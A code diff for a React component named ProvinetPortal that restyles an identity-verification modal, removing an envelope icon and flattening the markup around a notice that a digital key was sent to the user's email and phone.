@@ -572,29 +572,24 @@ export default function ProvinetPortal() {
               </div>
             </div>
             <div className="provi-modal-body" ref={formRef}>
-              <p>Por su seguridad, verifique su identidad completando los siguientes campos.</p>
+              <p style={{ fontSize:14, marginBottom:12 }}>Por su seguridad, verifique su identidad completando los siguientes campos.</p>
 
               {ceApproved && (
-                <div style={{ display:"flex", alignItems:"flex-start", gap:10, marginBottom:12 }}>
-                  <svg width="16" height="16" viewBox="0 0 24 24" fill="#1973B8" style={{ flexShrink:0, marginTop:2 }}>
-                    <path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/>
-                  </svg>
-                  <div>
-                    <div style={{ fontSize:13, fontWeight:600, color:"rgb(26,74,106)", marginBottom:4 }}>Clave digital enviada</div>
-                    <div style={{ fontSize:12, color:"rgb(42,90,138)", lineHeight:1.7 }}>
-                      {contactoInfo?.correo_electronico && (
-                        <div style={{ display:"flex", gap:6 }}>
-                          <span style={{ fontWeight:600, color:"rgb(26,74,106)", minWidth:52 }}>Correo:</span>
-                          <span>{contactoInfo.correo_electronico}</span>
-                        </div>
-                      )}
-                      {contactoInfo?.telefono_celular && (
-                        <div style={{ display:"flex", gap:6 }}>
-                          <span style={{ fontWeight:600, color:"rgb(26,74,106)", minWidth:52 }}>Celular:</span>
-                          <span>{contactoInfo.telefono_celular}</span>
-                        </div>
-                      )}
-                    </div>
+                <div style={{ marginBottom:12 }}>
+                  <div style={{ fontSize:13, fontWeight:600, color:"rgb(26,74,106)", marginBottom:4 }}>Clave digital enviada</div>
+                  <div style={{ fontSize:12, color:"rgb(42,90,138)", lineHeight:1.7 }}>
+                    {contactoInfo?.correo_electronico && (
+                      <div style={{ display:"flex", gap:6 }}>
+                        <span style={{ fontWeight:600, color:"rgb(26,74,106)", minWidth:52 }}>Correo:</span>
+                        <span>{contactoInfo.correo_electronico}</span>
+                      </div>
+                    )}
+                    {contactoInfo?.telefono_celular && (
+                      <div style={{ display:"flex", gap:6 }}>
+                        <span style={{ fontWeight:600, color:"rgb(26,74,106)", minWidth:52 }}>Celular:</span>
+                        <span>{contactoInfo.telefono_celular}</span>
+                      </div>
+                    )}
                   </div>
                 </div>
               )}
